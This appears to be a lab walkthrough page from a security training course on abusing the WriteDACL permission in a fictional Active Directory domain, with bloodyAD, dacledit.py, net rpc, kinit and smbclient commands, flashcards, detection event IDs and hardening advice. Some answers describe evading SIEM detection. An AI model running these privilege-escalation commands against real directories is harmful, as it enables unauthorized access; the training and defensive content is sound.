+<p>For class purposes, <code>GenericAll</code> is fine.</p>
+<h3 id="microsofts-behavior-on-group-memberships">Microsoft's behavior on group memberships</h3>
+<p>When you write the <code>member</code> attribute on a group, the changes propagate immediately to the local DC and replicate to peer DCs at the next replication cycle (typically 15 minutes intra-site, 180 minutes inter-site). Your effective permissions update instantly on the local DC; you may need to wait for replication if you are authenticating against a different DC. In Nordport's single-DC setup this is not a concern.</p>
+<hr />
+<h2 id="tool-primer">Tool Primer</h2>
+<h3 id="bloodyad-ace-manipulation">bloodyAD ACE manipulation</h3>
+<p>Add a GenericAll ACE for <code>j.chen</code> on the group:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>bloodyAD<span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>--host<span class="w"> </span>corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span>add<span class="w"> </span>genericAll<span class="w"> </span><span class="s2">&quot;Backup_Operators_&lt;token&gt;&quot;</span><span class="w"> </span>j.chen
+</code></pre></div>
+<p>Remove that ACE later (cleanup):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>bloodyAD<span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>--host<span class="w"> </span>corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="w">  </span>remove<span class="w"> </span>genericAll<span class="w"> </span><span class="s2">&quot;Backup_Operators_&lt;token&gt;&quot;</span><span class="w"> </span>j.chen
+</code></pre></div>
+<h3 id="dacleditpy-impacket">dacledit.py (impacket)</h3>
+<p>Linux equivalent for ACL writes:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>dacledit.py<span class="w"> </span>-action<span class="w"> </span>write<span class="w"> </span>-rights<span class="w"> </span>FullControl<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span>-principal<span class="w"> </span>j.chen<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span>-target-dn<span class="w"> </span><span class="s2">&quot;CN=Backup_Operators_&lt;token&gt;,OU=IT,DC=corp,DC=nordport,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span>-dc-ip<span class="w"> </span>corp-dc01<span class="w"> </span>corp.nordport.local/j.chen:<span class="s1">&#39;Welcome2026#&#39;</span>
+</code></pre></div>
+<h3 id="group-membership-writes-via-net-rpc">Group membership writes via net rpc</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>addmem<span class="w"> </span><span class="s2">&quot;Backup_Operators_&lt;token&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;j.chen&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span>-U<span class="w"> </span><span class="s2">&quot;CORP\j.chen%Welcome2026#&quot;</span><span class="w"> </span>-S<span class="w"> </span>corp-dc01
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>delmem<span class="w"> </span><span class="s2">&quot;Backup_Operators_&lt;token&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;j.chen&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">  </span>-U<span class="w"> </span><span class="s2">&quot;CORP\j.chen%Welcome2026#&quot;</span><span class="w"> </span>-S<span class="w"> </span>corp-dc01
+</code></pre></div>
+<h3 id="confirm-via-bloodhound">Confirm via BloodHound</h3>
+<p>Canonical BHCE form (paste as one line; substitute your uppercase token):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">g</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">WriteDACL</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">t</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">g</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&#39;IT_HELPDESK@CORP.NORDPORT.LOCAL&#39;</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span><span class="n">t</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">CONTAINS</span><span class="w"> </span><span class="s">&#39;&lt;TOKEN&gt;&#39;</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">t</span>
+</code></pre></div>
+<hr />
+<h2 id="walkthrough">Walkthrough</h2>
+<h3 id="step-1-confirm-the-writedacl-edge">Step 1: Confirm the WriteDACL Edge</h3>
+<p>Always confirm before exercising. WriteDACL is a quiet permission that is easy to miss when the graph is busy. In BloodHound CE search for <code>IT_HelpDesk</code>, then click "Outbound Object Control" in the left panel. The "WriteDACL" row lists every object IT_HelpDesk can rewrite the ACL for. The per-token <code>Backup_Operators_&lt;token&gt;</code> group should be there.</p>
+<p>Cypher equivalent (paste as one line; substitute your uppercase token like <code>J001</code>):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">MATCH</span><span class="w"> </span><span class="p">(</span><span class="n">g</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="o">-[</span><span class="p">:</span><span class="n">WriteDACL</span><span class="o">]-&gt;</span><span class="p">(</span><span class="n">t</span><span class="p">:</span><span class="n">Group</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">g</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&#39;IT_HELPDESK@CORP.NORDPORT.LOCAL&#39;</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span><span class="n">t</span><span class="p">.</span><span class="n">name</span><span class="w"> </span><span class="n">CONTAINS</span><span class="w"> </span><span class="s">&#39;&lt;UPPER_TOKEN&gt;&#39;</span><span class="w"> </span><span class="k">RETURN</span><span class="w"> </span><span class="n">t</span>
+</code></pre></div>
+<h3 id="step-2-add-a-genericall-ace-for-jchen">Step 2: Add a GenericAll ACE for j.chen</h3>
+<p><code>bloodyAD add genericAll &lt;object&gt; &lt;principal&gt;</code> writes one new ACE into the object's DACL. The DC checks j.chen's effective rights on the target; the WriteDACL ACE inherited from IT_HelpDesk membership permits the modification. The new ACE grants j.chen full control over the object going forward.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Grant yourself GenericAll on the group via bloodyAD</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>bloodyAD<span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>--host<span class="w"> </span>corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="w">  </span>add<span class="w"> </span>genericAll<span class="w"> </span><span class="s2">&quot;Backup_Operators_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>j.chen
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>add genericAll &lt;obj&gt; &lt;principal&gt;</code></td>
+<td>Append a <code>GENERIC_ALL</code> ACE for <code>&lt;principal&gt;</code> to <code>&lt;obj&gt;</code>'s DACL.</td>
+</tr>
+<tr>
+<td><code>--host &lt;dc&gt;</code></td>
+<td>Target DC. bloodyAD speaks LDAP/RPC to this server.</td>
+</tr>
+<tr>
+<td><code>&lt;obj&gt;</code></td>
+<td>Target object name (sAMAccountName for users/groups, CN for computers).</td>
+</tr>
+</tbody>
+</table>
+<p>Verify the ACE landed:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>bloodyAD<span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>--host<span class="w"> </span>corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span>get<span class="w"> </span>object<span class="w"> </span><span class="s2">&quot;Backup_Operators_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>--attr<span class="w"> </span>nTSecurityDescriptor
+</code></pre></div>
+<p>A new ACE for <code>j.chen</code> granting <code>GENERIC_ALL</code> should appear in the SDDL output.</p>
+</div>
+<h3 id="step-3-add-jchen-to-the-group">Step 3: Add j.chen to the Group</h3>
+<p>With GenericAll in place you can write the <code>member</code> attribute. <code>net rpc group addmem</code> is the SAMR way; bloodyAD's <code>add groupMember</code> is the LDAP way. Both produce the same domain state.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - net rpc group addmem</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>addmem<span class="w"> </span><span class="s2">&quot;Backup_Operators_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;j.chen&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span>-U<span class="w"> </span><span class="s2">&quot;CORP\j.chen%Welcome2026#&quot;</span><span class="w"> </span>-S<span class="w"> </span>corp-dc01
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>group addmem</code></td>
+<td>Subcommand: add member to group.</td>
+</tr>
+<tr>
+<td><code>"&lt;group&gt;"</code></td>
+<td>First positional.</td>
+</tr>
+<tr>
+<td><code>"&lt;user&gt;"</code></td>
+<td>Second positional.</td>
+</tr>
+<tr>
+<td><code>-U "DOM\u%pw"</code></td>
+<td>Authenticate as this principal.</td>
+</tr>
+<tr>
+<td><code>-S &lt;dc&gt;</code></td>
+<td>Target server.</td>
+</tr>
+</tbody>
+</table>
+<p>Or via bloodyAD (idempotent; safe to re-run):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>bloodyAD<span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>--host<span class="w"> </span>corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">&quot;Backup_Operators_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>j.chen
+</code></pre></div>
+</div>
+<h3 id="step-4-get-a-fresh-kerberos-ticket">Step 4: Get a Fresh Kerberos Ticket</h3>
+<p>Group memberships are baked into the PAC inside your TGT at the moment of issuance. The TGT you already hold lists your previous groups; the KDC will not silently rewrite it. To exercise the new membership you must request a new TGT, which means a fresh AS-REQ.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Re-authenticate to refresh group membership</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>kdestroy
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>kinit<span class="w"> </span>j.chen@CORP.NORDPORT.LOCAL
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>kdestroy</code></td>
+<td>Delete the existing credential cache.</td>
+</tr>
+<tr>
+<td><code>kinit &lt;user&gt;@&lt;REALM&gt;</code></td>
+<td>Request a new TGT. The realm must be uppercase.</td>
+</tr>
+<tr>
+<td><code>echo '&lt;pw&gt;' \|</code></td>
+<td>Pipe the password to skip the interactive prompt.</td>
+</tr>
+</tbody>
+</table>
+<p>Alternatively, the next SMB connection initiated by <code>netexec</code> or <code>smbclient</code> triggers a fresh authentication and receives a PAC with the new group automatically.</p>
+</div>
+<h3 id="step-5-read-the-per-token-flag">Step 5: Read the Per-Token Flag</h3>
+<p>The flag file lives in <code>\\corp-dc01\BackupFlags\&lt;token&gt;\FLAG.txt</code>. The DACL on that directory grants <code>Backup_Operators_&lt;token&gt;</code> the read right; with your fresh PAC, j.chen now inherits that right.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Pull FLAG.txt from your token directory</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>smbclient<span class="w"> </span>//corp-dc01/BackupFlags<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span>-U<span class="w"> </span><span class="s2">&quot;CORP\j.chen%Welcome2026#&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span>-c<span class="w"> </span><span class="s2">&quot;cd </span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">; get FLAG.txt&quot;</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>cat<span class="w"> </span>FLAG.txt
+</code></pre></div>
+<p>Submit the OCR{...} value.</p>
+</div>
+<h3 id="step-6-cleanup-operational-hygiene">Step 6: Cleanup (Operational Hygiene)</h3>
+<p>Order matters. Remove yourself from the group <strong>first</strong>; you still have GenericAll via the ACE, which lets you make that change. Then remove the ACE. If you do these in reverse you remove the ACE before removing the membership, and you no longer have the right to clean up your own membership.</p>
+<div class="admonition kali">
+<p class="admonition-title">Kali - Remove your ACE and group membership in correct order</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>delmem<span class="w"> </span><span class="s2">&quot;Backup_Operators_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;j.chen&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span>-U<span class="w"> </span><span class="s2">&quot;CORP\j.chen%Welcome2026#&quot;</span><span class="w"> </span>-S<span class="w"> </span>corp-dc01
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>bloodyAD<span class="w"> </span>-d<span class="w"> </span>corp.nordport.local<span class="w"> </span>-u<span class="w"> </span>j.chen<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Welcome2026#&#39;</span><span class="w"> </span>--host<span class="w"> </span>corp-dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="w">  </span>remove<span class="w"> </span>genericAll<span class="w"> </span><span class="s2">&quot;Backup_Operators_</span><span class="si">${</span><span class="nv">OCR_SCOPE_TOKEN</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span>j.chen
+</code></pre></div>
+<p>The cleanup is not scored. The habit is the point.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Common gotchas</p>
+<ul>
+<li><strong>Cleanup order</strong>: removing the ACE before removing the membership leaves you stuck (no rights to remove yourself). Always remove membership first.</li>
+<li><strong>PAC stale</strong>: if <code>smbclient</code> returns <code>NT_STATUS_ACCESS_DENIED</code> after step 3, you skipped step 4. The fresh ticket is required.</li>
+<li><strong>Group nesting</strong>: in some configurations Backup_Operators_<token> is a member of Backup_Operators (the built-in). Your membership in the per-token group inherits transitively, but only after the ticket refresh.</li>
+<li><strong>bloodyAD permission cache</strong>: bloodyAD opens an LDAP bind once and reuses it. Run as a single command; running multiple bloodyAD invocations in quick succession works because each makes its own bind, but the per-bind permissions are evaluated fresh on the server.</li>
+</ul>
+</div>
+<hr />
+<h2 id="blue-team-perspective">Blue Team Perspective</h2>
+<p>The relevant signals fire on every WriteDACL chain; the noise around them is what makes detection hard. Defenders that diff DACLs against a baseline catch this attack reliably.</p>
+<table>
+<thead>
+<tr>
+<th>Activity</th>
+<th>Event ID</th>
+<th>Where it fires</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DACL change on object</td>
+<td>4670, 5136</td>
+<td>DC Security log</td>
+</tr>
+<tr>
+<td>Group membership added</td>
+<td>4728 / 4732 / 4756</td>
+<td>DC Security log</td>
+</tr>
+<tr>
+<td>Auth as new group member</td>
+<td>4624 logon type 3</td>
+<td>Target server log</td>
+</tr>
+<tr>
+<td>MDI privileged-group change</td>
+<td>"Suspicious modification of a sensitive group"</td>
+<td>Defender for Identity</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition info">
+<p class="admonition-title">Where the SOC catches WriteDACL</p>
+<p>Event 4670 fires thousands of times per day in normal operation, so raw volume is unusable. The detection that works is <strong>DACL diffing</strong>: take a snapshot of the SDDL on every Tier-0 and operator group weekly; alert on any new ACE granting <code>GenericAll</code>, <code>WriteDACL</code>, <code>WriteOwner</code>, or <code>GenericWrite</code> to a non-Tier-0 principal. Group-membership change events 4728/4732/4756 are also high-signal when paired with allow-listing of approved enrollers.</p>
+</div>
+<h2 id="hardening-note">Hardening Note</h2>
+<p>WriteDACL is the most insidious AD finding because the ACE itself is the persistence. Cleanup discipline is the difference between an audit finding and an actual compromise.</p>
+<div class="admonition tip">
+<p class="admonition-title">WriteDACL hardening</p>
+<ul>
+<li>Build DACL baselines for every Tier-0 group and user in a Tier-0 OU; diff weekly.</li>
+<li>Restrict <code>WriteDACL</code> and <code>WriteOwner</code> to the smallest possible set of trusted principals.</li>
+<li>Audit and remove orphaned ACEs from prior projects (see Q3 <code>dsacls.exe</code> workflow).</li>
+<li>Build a SIEM detection on group-membership change events (4728/4732/4756) with allow-list of legitimate enrollers.</li>
+<li>Forward DACL changes (event 5136) on Tier-0 objects to the SIEM with retention long enough to detect slow-burn persistence (90+ days).</li>
+</ul>
+</div>
+<hr />
+<h3 id="record-your-findings">Record Your Findings</h3>
+<blockquote>
+<p><strong>WriteDACL edge confirmed:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>IT_HelpDesk --WriteDACL--&gt; Backup_Operators_&lt;token&gt;
+</code></pre></div>
+<p><strong>ACE added:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>j.chen GENERIC_ALL on Backup_Operators_&lt;token&gt;
+</code></pre></div>
+<p><strong>Flag:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>(OCR{wd_...})
+</code></pre></div>
+<p><strong>Cleanup performed:</strong>  yes / no</p>
+</blockquote>
+<hr />
+<h2 id="analysis-questions">Analysis Questions</h2>
+<p><strong>1. Microsoft logs DACL changes as event 4670. From a SOC perspective, why is monitoring 4670 cleanly so hard, and what makes WriteDACL exploitation often invisible?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>Event 4670 fires whenever any object's DACL changes. AD writes thousands of these per day in normal operation: GPO updates, OU delegations adjusted by automation, scripts that adjust permissions during user provisioning, third-party tools rewriting ACLs after schema extensions. The signal-to-noise ratio is brutal. Most SOCs either turn 4670 logging off or filter it so heavily that only object-class changes (computer/user added or deleted) survive. WriteDACL exploitation produces a single 4670 against the target object with the new ACE in the SDDL string field; without parsing the SDDL and diffing against a known-good baseline, the SOC cannot tell that the new ACE grants attacker-controlled escalation. Defenders who do this well use change-monitoring products that diff DACLs against baselines and alert on new ACEs granting <code>GenericAll</code>, <code>WriteDACL</code>, <code>WriteOwner</code>, or <code>GenericWrite</code> to non-privileged principals.</p>
+</details>
+<p><strong>2. The exercise tells you to clean up your ACE before submitting. In a real engagement, when do you NOT clean up, and why?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>You do not clean up when (a) the engagement explicitly asks you to leave persistence so the defender can practice detection and response, (b) you are still mid-engagement and may need to re-exercise the path, or (c) the customer wants the exact attacker-state preserved for forensic investigation later. Outside those cases, always clean up: every artifact you leave behind is something the customer has to chase down during their post-engagement validation, and a sloppy red team that leaves dozens of GenericAll ACEs across the directory looks unprofessional. Modern engagement reports include a "cleanup performed" section that lists exactly which artifacts were created and which were removed. The discipline is also useful in real attacks: a long-term operator who leaves new ACEs scattered in the directory increases their detectable surface every day.</p>
+</details>
+<p><strong>3. The attack chain is WriteDACL -&gt; add GenericAll ACE -&gt; add member -&gt; profit. Why might a more careful operator add a more specific ACE than GenericAll?</strong></p>
+<details class="note">
+<summary>Reveal Answer</summary>
+<p>More specific ACEs (e.g., WriteProperty on the <code>member</code> attribute only) are quieter in three senses: (a) some SIEM rules trigger on <code>GenericAll</code> granted to non-Tier-0 principals but ignore property-specific writes; (b) attribute-specific ACEs read more like a normal delegated permission ("the helpdesk can manage group memberships") than a clear escalation; (c) audit reports that highlight the worst-rights-granted often miss attribute-specific ACEs because their audit logic focuses on FullControl. The trade-off is that property-specific ACEs require knowing the right attribute GUID. For groups that is <code>member</code> (<code>bf9679c0-0de6-11d0-a285-00aa003049e2</code>). For full operational discipline, learn the GUIDs for the common attributes you write often: <code>member</code> for groups, <code>pwdLastSet</code> and <code>userAccountControl</code> for users, <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> for computers (RBCD).</p>
+</details>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ul>
+<li>WriteDACL lets you add an ACE granting any further right; GenericAll on a group is the standard pick.</li>
+<li>Group membership changes are immediate locally but require a new TGT to land in your PAC.</li>
+<li>Cleanup is a habit: remove your ACE and your group membership at the end.</li>
+<li>Event 4670 logs the change but signal-to-noise is poor; defenders need DACL baselines.</li>
+<li>Property-specific ACEs are quieter than GenericAll; learn the common attribute GUIDs.</li>
+</ul>
+<h2 id="cheat-sheet-recap">Cheat Sheet Recap</h2>
+<p>The four operations below cover WriteDACL exploitation and clean cleanup. Run them in this order; reverse the cleanup order is critical.</p>
+<table>
+<thead>
+<tr>
+<th>Goal</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Add GenericAll ACE to group</td>
+<td><code>bloodyAD -d &lt;domain&gt; -u &lt;atk&gt; -p '&lt;pw&gt;' --host &lt;dc&gt; add genericAll "&lt;group&gt;" &lt;atk&gt;</code></td>
+</tr>
+<tr>
+<td>Add yourself to the group</td>
+<td><code>net rpc group addmem "&lt;group&gt;" "&lt;atk&gt;" -U "&lt;DOMAIN&gt;\&lt;atk&gt;%&lt;pw&gt;" -S &lt;dc&gt;</code></td>
+</tr>
+<tr>
+<td>Refresh PAC</td>
+<td><code>kdestroy; echo '&lt;pw&gt;' \| kinit &lt;atk&gt;@&lt;REALM&gt;</code></td>
+</tr>
+<tr>
+<td>Cleanup (in this order)</td>
+<td><code>net rpc group delmem "&lt;group&gt;" "&lt;atk&gt;" ...; bloodyAD ... remove genericAll "&lt;group&gt;" &lt;atk&gt;</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="spaced-repetition">Spaced Repetition</h2>
+<p><strong>Card 1: bloodyAD GenericAll ACE Add</strong></p>
+<p>Q: Write the bloodyAD command to add a GenericAll ACE for <code>j.smith</code> on group <code>Targets</code> in <code>corp.local</code>, authenticating as <code>j.smith</code> / <code>Pass#</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>bloodyAD<span class="w"> </span>-d<span class="w"> </span>corp.local<span class="w"> </span>-u<span class="w"> </span>j.smith<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Pass#&#39;</span><span class="w"> </span>--host<span class="w"> </span>dc01<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="w">  </span>add<span class="w"> </span>genericAll<span class="w"> </span><span class="s2">&quot;Targets&quot;</span><span class="w"> </span>j.smith
+</code></pre></div>
+<p>Reverse with <code>remove genericAll "Targets" j.smith</code>. The verb <code>add</code>/<code>remove</code> toggles ACE presence; targets are object names; principal is the user being granted.</p>
+</details>
+<p><strong>Card 2: net rpc Group Membership</strong></p>
+<p>Q: Add and then remove user <code>j.smith</code> from group <code>Targets</code> using <code>j.smith / Pass#</code> against DC <code>dc01</code>.</p>
+<details class="note">
+<summary>Answer</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>addmem<span class="w"> </span><span class="s2">&quot;Targets&quot;</span><span class="w"> </span><span class="s2">&quot;j.smith&quot;</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;DOM\j.smith%Pass#&quot;</span><span class="w"> </span>-S<span class="w"> </span>dc01
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>net<span class="w"> </span>rpc<span class="w"> </span>group<span class="w"> </span>delmem<span class="w"> </span><span class="s2">&quot;Targets&quot;</span><span class="w"> </span><span class="s2">&quot;j.smith&quot;</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;DOM\j.smith%Pass#&quot;</span><span class="w"> </span>-S<span class="w"> </span>dc01
+</code></pre></div>
+<p>The user authenticating must have permission on the group (typically GenericAll, GenericWrite, or AddMember on the <code>member</code> attribute).</p>
+</details>
+<p><strong>Card 3: PAC Refresh</strong></p>
+<p>Q: You added yourself to a group. Why might you still not see the new permission until you re-authenticate?</p>
+<details class="note">
+<summary>Answer</summary>
+<p>Group memberships are baked into the PAC inside your TGT at the time the TGT was issued. Subsequent TGS-REPs derived from that TGT inherit the same PAC. Your new membership only appears in tickets issued after a fresh AS exchange. To force the refresh: <code>kdestroy</code> then <code>kinit user@REALM</code>. SMB clients usually re-authenticate transparently on the next connection, but if you have a long-lived ticket cache (browser SSO, mounted shares), the new permission may not appear until you log out and back in.</p>
+</details>
+<p><strong>Card 4: Specific Attribute GUIDs</strong></p>
+<p>Q: Name the attribute GUID for the <code>member</code> attribute on a group object.</p>
+<details class="note">
+<summary>Answer</summary>
+<p><code>bf9679c0-0de6-11d0-a285-00aa003049e2</code>. Used in attribute-specific ACEs. Other common ones to memorize: <code>f3a64788-5306-11d1-a9c5-0000f80367c1</code> (servicePrincipalName), <code>bf967a0a-0de6-11d0-a285-00aa003049e2</code> (pwdLastSet), <code>3f78c3e5-f79a-46bd-a0b8-9d18116ddc79</code> (msDS-AllowedToActOnBehalfOfOtherIdentity, the RBCD attribute).</p>
+</details>
+<p><strong>Card 5: Cleanup Order</strong></p>
+<p>Q: You exercised WriteDACL: added a GenericAll ACE, joined the group. List the cleanup steps in correct order.</p>
+<details class="note">
+<summary>Answer</summary>
+<ol>
+<li>Remove yourself from the group: <code>net rpc group delmem "Group" "you"</code>. 2. Remove the ACE you added: <code>bloodyAD remove genericAll "Group" you</code>. Order matters: removing the ACE first kills your right to remove yourself from the group, leaving you stuck. If you forget step 1 and remove the ACE first, you can recover by re-exercising your WriteDACL right (if it still exists) or by getting a Domain Admin to clean up.</li>
+</ol>
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
